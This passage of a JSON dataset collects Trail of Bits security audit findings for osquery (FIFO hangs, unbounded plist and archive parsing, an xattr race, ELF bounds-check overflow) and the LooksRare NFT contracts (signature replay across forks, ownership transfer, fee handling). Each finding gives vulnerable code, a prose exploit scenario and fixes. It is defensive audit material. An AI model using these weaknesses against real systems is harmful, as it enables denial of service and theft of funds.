        "body": "To support several macOS-specic tables, osquery contains a function called osquery::parsePlist, which reads and parses property list (.plist) les by using the Apple Foundation framework class NSPropertyListSerialization. The parsePlist function is used by tables such as browser_plugins and xprotect_reports to read user-accessible les. The function does not have any limit on the amount of data that it will parse. id ns_path = [NSString stringWithUTF8String:path.string().c_str()]; id stream = [NSInputStream inputStreamWithFileAtPath:ns_path]; if (stream == nil) { return Status(1, \"Unable to read plist: \" + path.string()); } // Read file content into a data object, containing potential plist data. NSError* error = nil; [stream open]; id plist_data = [NSPropertyListSerialization propertyListWithStream:stream options:0 format:NULL error:&error]; Figure 7.1: The parsePlist implementation does not have a limit on the amount of data that it can deserialize. 26 Atlassian: osquery Security Assessment auto info_path = path + \"/Contents/Info.plist\"; // Ensure that what we're processing is actually a plug-in. if (!pathExists(info_path)) { return; } if (osquery::parsePlist(info_path, tree).ok()) { // Plugin did not include an Info.plist, or it was invalid for (const auto& it : kBrowserPluginKeys) { r[it.second] = tree.get(it.first, \"\"); // Convert bool-types to an integer. jsonBoolAsInt(r[it.second]); } } Figure 7.2: browser_plugins uses parsePlist on user-controlled les. Exploit Scenario An attacker crafts a large, valid .plist le and stores it in ~/Library/Internet Plug-Ins/foo/Contents/Info.plist on a macOS system running the osquery daemon. When osquery executes a query using the browser_plugins table, it reads and parses the complete le, causing high resource consumption. Recommendations Short term, modify the browser_plugins and xprotect_reports tables to enforce a maximum le size (e.g., by combining readFile and parsePlistContent). Long term, to prevent this issue in future tables, consider removing the parsePlist function or rewriting it as a helper function around a safer implementation. 27 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. The parsePlist function can hang on reading certain les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The osquery codebase contains a function called osquery::parsePlist, which reads and parses .plist les. This function opens the target le directly by using the inputStreamWithFileAtPath method from NSInputStream, as shown in gure 7.1 in the previous nding, and passes the resulting input stream to NSPropertyListSerialization for direct consumption. However, parsePlist can hang on reading certain les. For example, if the le to be read is a FIFO, the function blocks the osquery thread until another program or thread opens the FIFO to write to it. Exploit Scenario An attacker creates a FIFO le on a macOS device in ~/Library/Internet Plug-Ins/foo/Contents/Info.plist or ~/Library/Logs/DiagnosticReports/XProtect-foo using the mkfifo command. The osquery agent attempts to open and read the le when building a response for queries on the browser_plugins and xprotect_reports tables, but parsePlist blocks the osquery thread indenitely, leaving osquery unable to respond to the query request. Recommendations Short term, implement a check in parsePlist to verify that the .plist le to be read is not a special le. Long term, introduce a timeout on le operations so that a block does not stall the osquery thread. Also consider replacing parsePlist in favor of the parsePlistContent function and standardizing all le reads on a single code path to prevent similar issues going forward. 28 Atlassian: osquery Security Assessment 9. The parseJSON function can hang on reading certain les on Linux and macOS Severity: Medium Diculty: Low Type: Denial of Service Finding ID: TOB-ATL-9 Target: osquery/filesystem/filesystem.cpp",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. No limit on the amount of data read or expanded from the Safari extensions table ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The safari_extensions table allows the agent to query installed Safari extensions on a certain user prole. Said extensions consist of extensible archive format (XAR) compressed archives with the .safariextz le extension, which are stored in the ~/Library/Safari/Extensions folder. The osquery program does not have a limit on the amount of data that can be processed when reading and inating the Safari extension contents; a large amount of data may cause a denial of service. 31 Atlassian: osquery Security Assessment xar_t xar = xar_open(path.c_str(), READ); if (xar == nullptr) { TLOG << \"Cannot open extension archive: \" << path; return; } xar_iter_t iter = xar_iter_new(); xar_file_t xfile = xar_file_first(xar, iter); size_t max_files = 500; for (size_t index = 0; index < max_files; ++index) { if (xfile == nullptr) { break; } char* xfile_path = xar_get_path(xfile); if (xfile_path == nullptr) { break; } // Clean up the allocated content ASAP. std::string entry_path(xfile_path); free(xfile_path); if (entry_path.find(\"Info.plist\") != std::string::npos) { if (xar_verify(xar, xfile) != XAR_STREAM_OK) { TLOG << \"Extension info extraction failed verification: \" << path; } size_t size = 0; char* buffer = nullptr; if (xar_extract_tobuffersz(xar, xfile, &buffer, &size) != 0 || size == 0) { break; } std::string content(buffer, size); free(buffer); pt::ptree tree; if (parsePlistContent(content, tree).ok()) { for (const auto& it : kSafariExtensionKeys) { r[it.second] = tree.get(it.first, \"\"); } } break; } 32 Atlassian: osquery Security Assessment xfile = xar_file_next(iter); } Figure 10.1: genSafariExtension extracts the full Info.plist to memory. Exploit Scenario An attacker crafts a valid extension containing a large Info.plist le and stores it in ~/Library/Safari/Extensions/foo.safariextz. When the osquery agent attempts to respond to a query on the safari_extensions table, it opens the archive and expands the full Info.plist le in memory, causing high resource consumption. Recommendations Short term, enforce a limit on the amount of information that can be extracted from an XAR archive. Long term, add guidelines to the development documentation on handling untrusted input data. For instance, advise developers to limit the amount of data that may be ingested, processed, or read from untrusted sources such as user-writable les. Enforce said guidelines by performing code reviews on new contributions. 33 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Extended attributes table may read uninitialized or out-of-bounds memory ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The extended_attributes table calls the listxattr function twice: rst to query the extended attribute list size and then to actually retrieve the list of attribute names. Additionally, the return values from the function calls are not checked for errors. This leads to a race condition in the parseExtendedAttributeList osquery function, in which the content buer is left uninitialized if the target le is deleted in the time between the two listxattr calls. As a result, std::string will consume uninitialized and unbounded memory, potentially leading to out-of-bounds memory reads. std::vector<std::string> attributes; ssize_t value = listxattr(path.c_str(), nullptr, (size_t)0, 0); char* content = (char*)malloc(value); if (content == nullptr) { return attributes; } ssize_t ret = listxattr(path.c_str(), content, value, 0); if (ret == 0) { free(content); return attributes; } char* stable = content; do { attributes.push_back(std::string(content)); content += attributes.back().size() + 1; } while (content - stable < value); free(stable); return attributes; Figure 11.1: parseExtendedAttributeList calls listxattr twice. 34 Atlassian: osquery Security Assessment Exploit Scenario An attacker creates and runs a program to race osquery while it is fetching extended attributes from the le system. The attacker is successful and causes the osquery agent to crash with a segmentation fault. Recommendations Short term, rewrite the aected code to check the return values for errors. Replace listxattr with flistxattr, which operates on opened le descriptors, allowing it to continue to query extended attributes even if the le is removed (unlink-ed) from the le system. Long term, establish and enforce best practices for osquery contributions by leveraging automated tooling and code reviews to prevent similar issues from reoccurring. For example, use le descriptors instead of le paths when you need to perform more than one operation on a le to ensure that the le is not deleted or replaced mid-operation. Consider using static analysis tools such as CodeQL to look for other instances of similar issues in the code and to detect new instances of the problem on new contributions. 35 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. The readFile function can hang on reading a le ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The readFile function is used to provide a standardized way to read les. It uses the read_max variable to prevent the functions from reading excessive amounts of data. It also selects one of two modes, blocking or non-blocking, depending on the le properties. When using the blocking approach, it reads block_size-sized chunks of the le, with a minimum of 4,096 bytes, and returns the chunks to the caller. However, the call to read can block the osquery thread when reading certain les. if (handle.blocking_io) { // Reset block size to a sane minimum. block_size = (block_size < 4096) ? 4096 : block_size; ssize_t part_bytes = 0; bool overflow = false; do { std::string part(block_size, '\\0'); part_bytes = handle.fd->read(&part[0], block_size); if (part_bytes > 0) { total_bytes += static_cast<off_t>(part_bytes); if (total_bytes >= read_max) { return Status::failure(\"File exceeds read limits\"); } if (file_size > 0 && total_bytes > file_size) { overflow = true; part_bytes -= (total_bytes - file_size); } predicate(part, part_bytes); } } while (part_bytes > 0 && !overflow); } else { Figure 12.1: The blocking_io ow can stall. 36 Atlassian: osquery Security Assessment Exploit Scenario An attacker creates a symlink to /dev/tty in a path known to be read by the osquery agent. When the osquery agent attempts to read the le, it stalls. Recommendations Short term, ensure that the le operations in filesystem.cpp do not block the osquery thread. Long term, introduce a timeout on le operations so that a block does not stall the osquery thread. 37 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. The POSIX PlatformFile constructor may block the osquery thread ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The POSIX implementation of PlatformFiles constructor uses the open syscall to obtain a handle to the le. If the le to be opened is a FIFO, the call to open blocks the osquery thread unless the O_NONBLOCK ag is used. There are several places in the codebase in which the constructor is called without the PF_NONBLOCK ag set; all of these calls may stall on opening a FIFO. PlatformFile::PlatformFile(const fs::path& path, int mode, int perms) : fname_(path) { ... if ((mode & PF_NONBLOCK) == PF_NONBLOCK) { oflag |= O_NONBLOCK; is_nonblock_ = true; } if ((mode & PF_APPEND) == PF_APPEND) { oflag |= O_APPEND; } if (perms == -1 && may_create) { perms = 0666; } boost::system::error_code ec; if (check_existence && (!fs::exists(fname_, ec) || ec.value() != errc::success)) { handle_ = kInvalidHandle; } else { handle_ = ::open(fname_.c_str(), oflag, perms); } } Figure 13.1: The POSIX PlatformFile constructor 38 Atlassian: osquery Security Assessment ./filesystem/file_compression.cpp:26: PlatformFile inFile(in, PF_OPEN_EXISTING | PF_READ); ./filesystem/file_compression.cpp:32: PlatformFile outFile(out, PF_CREATE_ALWAYS | PF_WRITE); ./filesystem/file_compression.cpp:102: PlatformFile inFile(in, PF_OPEN_EXISTING | PF_READ); ./filesystem/file_compression.cpp:108: PlatformFile outFile(out, PF_CREATE_ALWAYS | PF_WRITE); ./filesystem/file_compression.cpp:177: PlatformFile pFile(f, PF_OPEN_EXISTING | PF_READ); ./filesystem/filesystem.cpp:242: PlatformFile fd(path, PF_OPEN_EXISTING | PF_WRITE); ./filesystem/filesystem.cpp:258: PlatformFile fd(path, PF_OPEN_EXISTING | PF_READ); ./filesystem/filesystem.cpp:531: PlatformFile fd(path, PF_OPEN_EXISTING | PF_READ); ./carver/carver.cpp:230: PlatformFile src(srcPath, PF_OPEN_EXISTING | PF_READ); Figure 13.2: Uses of PlatformFile without PF_NONBLOCK Exploit Scenario An attacker creates a FIFO le that is opened by one of the functions above, stalling the osquery agent. Recommendations Short term, investigate the uses of PlatformFile to identify possible blocks. Long term, use a static analysis tool such as CodeQL to scan the code for instances in which uses of the open syscall block the osquery thread. 39 Atlassian: osquery Security Assessment 14. No limit on the amount of data the Carver::blockwiseCopy method can write Severity: Medium Diculty: Low Type: Denial of Service Finding ID: TOB-ATL-14 Target: osquery/carver/carver.cpp",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. The carves table truncates large le sizes to 32 bits ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The enumerateCarves function uses rapidjson::Value::GetInt() to retrieve a size value from a JSON string. The GetInt return type is int, so it cannot represent sizes exceeding 32 bits; as a result, the size of larger les will be truncated. void enumerateCarves(QueryData& results, const std::string& new_guid) { std::vector<std::string> carves; scanDatabaseKeys(kCarves, carves, kCarverDBPrefix); for (const auto& carveGuid : carves) { std::string carve; auto s = getDatabaseValue(kCarves, carveGuid, carve); if (!s.ok()) { VLOG(1) << \"Failed to retrieve carve GUID\"; continue; } JSON tree; s = tree.fromString(carve); if (!s.ok() || !tree.doc().IsObject()) { VLOG(1) << \"Failed to parse carve entries: \" << s.getMessage(); return; } Row r; if (tree.doc().HasMember(\"time\")) { r[\"time\"] = INTEGER(tree.doc()[\"time\"].GetUint64()); } if (tree.doc().HasMember(\"size\")) { r[\"size\"] = INTEGER(tree.doc()[\"size\"].GetInt()); } stringToRow(\"sha256\", r, tree); 42 Atlassian: osquery Security Assessment stringToRow(\"carve_guid\", r, tree); stringToRow(\"request_id\", r, tree); stringToRow(\"status\", r, tree); stringToRow(\"path\", r, tree); // This table can be used to request a new carve. // If this is the case then return this single result. auto new_request = (!new_guid.empty() && new_guid == r[\"carve_guid\"]); r[\"carve\"] = INTEGER((new_request) ? 1 : 0); results.push_back(r); } } } // namespace Figure 15.1: The enumerateCarves function truncates les of large sizes. Exploit Scenario An attacker creates a le on disk of a size that overows 32 bits by only a small amount, such as 0x100001336. The carves tables reports the le size incorrectly as 0x1336 bytes. The attacker bypasses checks based on the reported le size. Recommendations Short term, use GetUint64 instead of GetInt to retrieve the le size. Long term, use static analysis tools such as CodeQL to look for other instances in which a type of size int is retrieved from JSON and stored in an INTEGER eld. 43 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "16. The time table may not null-terminate strings correctly ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The osquery time table uses strftime to format time information, such as the time zone name, into user-friendly strings. If the amount of information to be written does not t in the provided buer, strftime returns zero and leaves the buer contents in an undened state. QueryData genTime(QueryContext& context) { Row r; time_t osquery_time = getUnixTime(); struct tm gmt; gmtime_r(&osquery_time, &gmt); struct tm now = gmt; auto osquery_timestamp = toAsciiTime(&now); char local_timezone[5] = {0}; { } struct tm local; localtime_r(&osquery_time, &local); strftime(local_timezone, sizeof(local_timezone), \"%Z\", &local); char weekday[10] = {0}; strftime(weekday, sizeof(weekday), \"%A\", &now); char timezone[5] = {0}; strftime(timezone, sizeof(timezone), \"%Z\", &now); Figure 16.1: genTime uses strftime to get the time zone name and day of the week. The strings to be written vary depending on the locale conguration, so some strings may not t in the provided buer. The code does not check the return value of strftime and assumes that the string buer is always null-terminated, which may not always be the case. 44 Atlassian: osquery Security Assessment Exploit Scenario An attacker nds a way to change the time zone on a system in which %Z shows the full time zone name. When the osquery agent attempts to respond to a query on the time table, it triggers undened behavior. Recommendations Short term, add a check to verify the return value of each strftime call made by the table implementation. If the function returns zero, ensure that the system writes a valid string in the buer before it is used as part of the table response. Long term, perform code reviews on new contributions and consider using automated code analysis tools to prevent these kinds of issues from reoccurring. 45 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. The elf_info table can crash the osquery agent ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The elf_info table uses the libelfin library to read properties of ELF les. The library maps the entire ELF binary into virtual memory and then uses memory accesses to read the data. Specically, the load method of the mmap_loader class returns a pointer to the data for a given oset and size. To ensure that the memory access stays within the bounds of the memory-mapped le, the library checks that the result of adding the oset and the size is less than the size of the le. However, this check does not account for the possibility of overows in the addition operation. For example, an oset of 0xffffffffffffffff and a size of 1 would overow to the value 0. This makes it possible to bypass the check and to create references to memory outside of the bounds. The elf_info table indirectly uses this function when loading section headers from an ELF binary. class mmap_loader : public loader { public: void *base; size_t lim; mmap_loader(int fd) { off_t end = lseek(fd, 0, SEEK_END); if (end == (off_t)-1) throw system_error(errno, system_category(), \"finding file length\"); lim = end; base = mmap(nullptr, lim, PROT_READ, MAP_SHARED, fd, 0); if (base == MAP_FAILED) throw system_error(errno, system_category(), \"mmap'ing file\"); close(fd); } ... 46 Atlassian: osquery Security Assessment const void *load(off_t offset, size_t size) { } }; if (offset + size > lim) throw range_error(\"offset exceeds file size\"); return (const char*)base + offset; Figure 17.1: The libenfin librarys limit check does not account for overows. Exploit Scenario An attacker knows of a writable path in which osquery scans ELF binaries. He creates a malformed ELF binary, causing the pointer returned by the vulnerable function to point to an arbitrary location. He uses this to make the osquery agent crash, leak information from the process memory, or circumvent address space layout randomization (ASLR). Recommendations Short term, work with the developers of the libelfbin project to account for overows in the check. Long term, implement the recommendations in TOB-ATL-2 to minimize the impact of similar issues. 47 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Risk of reuse of signatures across forks due to lack of chainID validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "At construction, the LooksRareExchange contract computes the domain separator using the networks chainID , which is xed at the time of deployment. In the event of a post-deployment chain fork, the chainID cannot be updated, and the signatures may be replayed across both versions of the chain. constructor ( address _currencyManager , address _executionManager , address _royaltyFeeManager , address _WETH , address _protocolFeeRecipient ) { // Calculate the domain separator DOMAIN_SEPARATOR = keccak256 ( abi.encode( 0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f , // keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\") 0xda9101ba92939daf4bb2e18cd5f942363b9297fbc3232c9dd964abb1fb70ed71 , // keccak256(\"LooksRareExchange\") 0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6 , // keccak256(bytes(\"1\")) for versionId = 1 block.chainid , address ( this ) ) ); currencyManager = ICurrencyManager(_currencyManager); executionManager = IExecutionManager(_executionManager); royaltyFeeManager = IRoyaltyFeeManager(_royaltyFeeManager); WETH = _WETH; protocolFeeRecipient = _protocolFeeRecipient; Figure 1.1: contracts/contracts/LooksRareExchange.sol#L137-L145 The _validateOrder function in the LooksRareExchange contract uses a SignatureChecker function, verify , to check the validity of a signature: // Verify the validity of the signature require ( SignatureChecker.verify( orderHash, makerOrder.signer, makerOrder.v, makerOrder.r, makerOrder.s, DOMAIN_SEPARATOR ), \"Signature: Invalid\" ); Figure 1.2: contracts/contracts/LooksRareExchange.sol#L576-L587 However, the verify function checks only that a user has signed the domainSeparator . As a result, in the event of a hard fork, an attacker could reuse signatures to receive user funds on both chains. To mitigate this risk, if a change in the chainID is detected, the domain separator can be cached and regenerated. Alternatively, instead of regenerating the entire domain separator, the chainID can be included in the schema of the signature passed to the order hash. /** * @notice Returns whether the signer matches the signed message * @param hash the hash containing the signed mesage * @param signer the signer address to confirm message validity * @param v parameter (27 or 28) * @param r parameter * @param s parameter * @param domainSeparator paramer to prevent signature being executed in other chains and environments * @return true --> if valid // false --> if invalid */ function verify ( bytes32 hash , address signer , uint8 v , bytes32 r , bytes32 s , bytes32 domainSeparator ) internal view returns ( bool ) { // \\x19\\x01 is the standardized encoding prefix // https://eips.ethereum.org/EIPS/eip-712#specification bytes32 digest = keccak256 (abi.encodePacked( \"\\x19\\x01\" , domainSeparator, hash )); if (Address.isContract(signer)) { // 0x1626ba7e is the interfaceId for signature contracts (see IERC1271) return IERC1271(signer).isValidSignature(digest, abi.encodePacked(r, s, v)) == 0x1626ba7e ; } else { return recover(digest, v, r, s) == signer; } } Figure 1.3: contracts/contracts/libraries/SignatureChecker.sol#L41-L68 The signature schema does not account for the contracts chain. If a fork of Ethereum is made after the contracts creation, every signature will be usable in both forks. Exploit Scenario Bob signs a maker order on the Ethereum mainnet. He signs the domain separator with a signature to sell an NFT. Later, Ethereum is hard-forked and retains the same chain ID. As a result, there are two parallel chains with the same chain ID, and Eve can use Bobs signature to match orders on the forked chain. Recommendations Short term, to prevent post-deployment forks from aecting signatures, add the chain ID opcode to the signature schema. Long term, identify and document the risks associated with having forks of multiple chains and develop related mitigation strategies.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Lack of two-step process for contract ownership changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "The owner of a LooksRare protocol contract can be changed by calling the transferOwnership function in OpenZeppelins Ownable contract. This function internally calls the _transferOwnership function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. /** * @dev Leaves the contract without owner. It will not be possible to call * `onlyOwner` functions anymore. Can only be called by the current owner. * * NOTE: Renouncing ownership will leave the contract without an owner, * thereby removing any functionality that is only available to the owner. */ function renounceOwnership () public virtual onlyOwner { _transferOwnership( address ( 0 )); } /** * @dev Transfers ownership of the contract to a new account (`newOwner`). * Can only be called by the current owner. */ function transferOwnership ( address newOwner ) public virtual onlyOwner { require (newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ); _transferOwnership(newOwner); } /** * @dev Transfers ownership of the contract to a new account (`newOwner`). * Internal function without access restriction. */ function _transferOwnership ( address newOwner ) internal virtual { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); } Figure 2.1: OpenZeppelins Ownable contract Exploit Scenario Alice and Bob invoke the transferOwnership() function on the LooksRare multisig wallet to change the address of an existing contracts owner. They accidentally enter the wrong address, and ownership of the contract is transferred to the incorrect address. As a result, access to the contract is permanently revoked. Recommendations Short term, implement a two-step process to transfer contract ownership, in which the owner proposes a new address and then the new address executes a call to accept the role, completing the transfer. Long term, identify and document all possible actions that can be taken by privileged accounts ( appendix E ) and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "Although dependency scans did not identify a direct threat to the project under review, npm and yarn audit identied a dependency with a known vulnerability. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details the high severity issue: CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Users that create ask orders cannot modify minPercentageToAsk ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "Users who sell their NFTs on LooksRare are unable to protect their orders against arbitrary changes in royalty fees set by NFT collection owners; as a result, users may receive less of a sales value than expected. Ideally, when a user lists an NFT, he should be able to set a threshold at which the transaction will execute based on the amount of the sales value that he will receive. This threshold is set via the minPercentageToAsk variable in the MakerOrder and TakerOrder structs. The minPercentageToAsk variable protects users who create ask orders from excessive royalty fees. When funds from an order are transferred, the LooksRareExchange contract ensures that the percentage amount that needs to be transferred to the recipient is greater than or equal to minPercentageToAsk (gure 3.1). function _transferFeesAndFunds ( address strategy , address collection , uint256 tokenId , address currency , address from , address to , uint256 amount , uint256 minPercentageToAsk ) internal { // Initialize the final amount that is transferred to seller uint256 finalSellerAmount = amount; // 1. Protocol fee { uint256 protocolFeeAmount = _calculateProtocolFee(strategy, amount); [...] finalSellerAmount -= protocolFeeAmount; } } // 2. Royalty fee { ( address royaltyFeeRecipient , uint256 royaltyFeeAmount ) = royaltyFeeManager.calculateRoyaltyFeeAndGetRecipient( collection, tokenId, amount ); // Check if there is a royalty fee and that it is different to 0 [...] finalSellerAmount -= royaltyFeeAmount; [...] require ( (finalSellerAmount * 10000 ) >= (minPercentageToAsk * amount), \"Fees: Higher than expected\" ); [...] } Figure 4.1: The _transferFeesAndFunds function in LooksRareExchange :422-466 However, users creating ask orders cannot modify minPercentageToAsk . By default, the minPercentageToAsk of orders placed through the LooksRare platform is set to 85%. In cases in which there is no royalty fee and the protocol fee is 2%, minPercentageToAsk could be set to 98%. Exploit Scenario Alice lists an NFT for sale on LooksRare. The protocol fee is 2%, minPercentageToAsk is 85%, and there is no royalty fee. The NFT project grows in popularity, which motivates Eve, the owner of the NFT collection, to raise the royalty fee to 9.5%, the maximum fee allowed by the RoyaltyFeeRegistry contract. Bob purchases Alices NFT. Alice receives 89.5% of the sale even though she could have received 98% of the sale at the time of the listing. Recommendations Short term, set minPercentageToAsk to 100% minus the sum of the protocol fee and the max value for a royalty fee, which is 9.5%. Long term, identify and validate the bounds for all parameters and variables in the smart contract system.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Excessive privileges of RoyaltyFeeSetter and RoyaltyFeeRegistry owners ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "The RoyaltyFeeSetter and RoyaltyFeeRegistry contract owners can manipulate an NFT collections royalty information, such as the fee percentage and the fee receiver; this violates the principle of least privilege. NFT collection owners can use the RoyaltyFeeSetter contract to set the royalty information for their NFT collections. This information is stored in the RoyaltyFeeRegistry contract. However, the owners of the two contracts can also update this information (gures 5.1 and 5.2). function updateRoyaltyInfoForCollection ( address collection , address setter , address receiver , uint256 fee ) external override onlyOwner { require (fee <= royaltyFeeLimit, \"Registry: Royalty fee too high\" ); _royaltyFeeInfoCollection[collection] = FeeInfo({ setter: setter, receiver: receiver, fee: fee }); emit RoyaltyFeeUpdate(collection, setter, receiver, fee); } Figure 5.1: The updateRoyaltyInfoForCollection function in RoyaltyFeeRegistry :54- function updateRoyaltyInfoForCollection ( address collection , address setter , address receiver , uint256 fee ) external onlyOwner { IRoyaltyFeeRegistry(royaltyFeeRegistry).updateRoyaltyInfoForCollection( collection, setter, receiver, fee ); } Figure 5.2: The updateRoyaltyInfoForCollection function in RoyaltyFeeSetter :102-109 This violates the principle of least privilege. Since it is the responsibility of the NFT collections owner to set the royalty information, it is unnecessary for contract owners to have the same ability. Exploit Scenario Alice, the owner of the RoyaltyFeeSetter contract, sets the incorrect receiver address when updating the royalty information for Bobs NFT collection. Bob is now unable to receive fees from his NFT collections secondary sales. Recommendations Short term, remove the ability for users to update an NFT collections royalty information. Long term, clearly document the responsibilities and levels of access provided to privileged users of the system. 6. Insu\u0000cient protection of sensitive information Severity: Low Diculty: High Type: Conguration Finding ID: TOB-LR-6 Target: contracts/hardhat.config.ts",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Contracts used as dependencies do not track upstream changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "The LooksRare codebase uses a third-party contract, SignatureChecker , but the LooksRare documentation does not specify which version of the contract is used or whether it was modied. This indicates that the LooksRare protocol does not track upstream changes in contracts used as dependencies. Therefore, the LooksRare contracts may not reliably reect updates or security xes implemented in their dependencies, as those updates must be manually integrated into the contracts. Exploit Scenario A third-party contract used in LooksRare receives an update with a critical x for a vulnerability, but the update is not manually integrated in the LooksRare version of the contract. An attacker detects the use of a vulnerable contract in the LooksRare protocol and exploits the vulnerability against one of the contracts. Recommendations Short term, review the codebase and document the source and version of each dependency. Include third-party sources as submodules in the projects Git repository to maintain internal path consistency and ensure that dependencies are updated periodically. Long term, use an Ethereum development environment and NPM to manage packages in the project.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Missing event for a critical operation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "The system does not emit an event when a protocol fee is levied in the _transferFeesAndFunds and _transferFeesAndFundsWithWETH functions. Operations that transfer value or perform critical operations should trigger events so that users and o-chain monitoring tools can account for important state changes. if ((protocolFeeRecipient != address (0)) && (protocolFeeAmount != 0)) { IERC20(currency).safeTransferFrom(from, protocolFeeRecipient, protocolFeeAmount); finalSellerAmount -= protocolFeeAmount; } Figure 8.1: Protocol fee transfer in _transferFeesAndFunds function ( contracts/executionStrategies/StrategyDutchAuction.sol#L440-L443 ) Exploit Scenario A smart contract wallet provider has a LooksRare integration that enables its users to buy and sell NFTs. The front end relies on information from LooksRares subgraph to itemize prices, royalties, and fees. Because the system does not emit an event when a protocol fee is incurred, an under-calculation in the wallet providers accounting leads its users to believe they have been overcharged. Recommendations Short term, add events for all critical operations that transfer value, such as when a protocol fee is assessed. Events are vital aids in monitoring contracts and detecting suspicious behavior. Long term, consider adding or accounting for a new protocol fee event in the LooksRare subgraph and any other o-chain monitoring tools LooksRare might be using.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Taker orders are not EIP-712 signatures ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
        "body": "When takers attempt to match order proposals, they are presented with an obscure blob of data. In contrast, makers are presented with a formatted data structure that makes it easier to validate transactions. struct TakerOrder { bool isOrderAsk ; // true --> ask / false --> bid address taker ; // msg.sender uint256 price ; // final price for the purchase uint256 tokenId ; uint256 minPercentageToAsk ; // // slippage protection (9000 --> 90% of the final price must return to ask) bytes params ; // other params (e.g., tokenId) } Figure 9.1: The TakerOrder struct in OrderTypes.sol :31-38 While this issue cannot be exploited directly, it creates an asymmetry between the user experience (UX) of makers and takers. Because of this, users depend on the information that the user interface (UI) displays to them and are limited by the UX of the wallet software they are using. Exploit Scenario 1 Eve, a malicious user, lists a new collection with the same metadata as another, more popular collection. Bob sees Eves listing and thinks that it is the legitimate collection. He creates an order for an NFT in Eves collection, and because he cannot distinguish the parameters of the transaction he is signing, he matches it, losing money in the process. Exploit Scenario 2 Alice, an attacker, compromises the UI, allowing her to manipulate the information displayed by it in order to make illegitimate collections look legitimate. This is a more extreme exploit scenario. Recommendations Short term, evaluate and document the current UI and the pitfalls that users might encounter when matching and creating orders. Long term, evaluate whether adding support for EIP-712 signatures in TakerOrder would minimize the issue and provide a better UX.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf",
